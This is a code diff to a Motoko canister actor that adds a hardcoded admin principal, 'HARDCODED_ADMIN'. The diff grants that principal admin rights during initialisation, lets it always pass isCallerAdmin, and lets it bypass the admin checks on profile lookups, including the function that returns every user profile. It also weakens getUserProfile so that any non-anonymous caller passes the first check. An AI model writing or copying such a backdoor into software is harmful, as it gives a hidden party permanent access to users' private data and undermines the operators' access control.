@@ -454,7 +454,13 @@ actor {
 
   // Sécurité et gestion des utilisateurs
   public shared ({ caller }) func initializeAccessControl() : async () {
-    AccessControl.initialize(accessControlState, caller);
+    // Ensure hardcoded admin always gets admin role
+    if (caller.toText() == HARDCODED_ADMIN) {
+      accessControlState.userRoles.add(caller, #admin);
+      accessControlState.adminAssigned := true;
+    } else {
+      AccessControl.initialize(accessControlState, caller);
+    };
   };
 
   public query ({ caller }) func getCallerUserRole() : async AccessControl.UserRole {
@@ -465,7 +471,11 @@ actor {
     AccessControl.assignRole(accessControlState, caller, user, role);
   };
 
+  // Hardcoded admin principal - always admin regardless of access control state
+  let HARDCODED_ADMIN : Text = "gilph-edmid-nr3ic-svhal-6eq2x-ef6kc-ll54b-f6ow2-wc6zo-yf3cx-sae";
+
   public query ({ caller }) func isCallerAdmin() : async Bool {
+    if (caller.toText() == HARDCODED_ADMIN) { return true };
     AccessControl.isAdmin(accessControlState, caller);
   };
 
@@ -813,11 +823,12 @@ actor {
   };
 
   public query ({ caller }) func getUserProfile(user : Principal) : async ?UserProfile {
-    if (not (AccessControl.hasPermission(accessControlState, caller, #user))) {
-      Runtime.trap("Unauthorized: Only users can view profiles");
+    let callerIsAdmin = caller.toText() == HARDCODED_ADMIN or AccessControl.isAdmin(accessControlState, caller);
+    if (caller.isAnonymous()) {
+      Runtime.trap("Unauthorized: Anonymous users cannot view profiles");
     };
 
-    if (caller != user and not AccessControl.isAdmin(accessControlState, caller)) {
+    if (caller != user and not callerIsAdmin) {
       Runtime.trap("Non autorisé : vous ne pouvez consulter que votre propre profil");
     };
     userProfiles.get(user);
@@ -858,7 +869,8 @@ actor {
 
   // Admin-only function to view all profiles
   public query ({ caller }) func obtenirTousLesProfils() : async [(Principal, UserProfile)] {
-    if (not (AccessControl.hasPermission(accessControlState, caller, #admin))) {
+    let callerIsAdmin = caller.toText() == HARDCODED_ADMIN or AccessControl.isAdmin(accessControlState, caller);
+    if (not callerIsAdmin) {
       Runtime.trap("Unauthorized: Only admins can view all profiles");
     };
     userProfiles.entries().toArray()
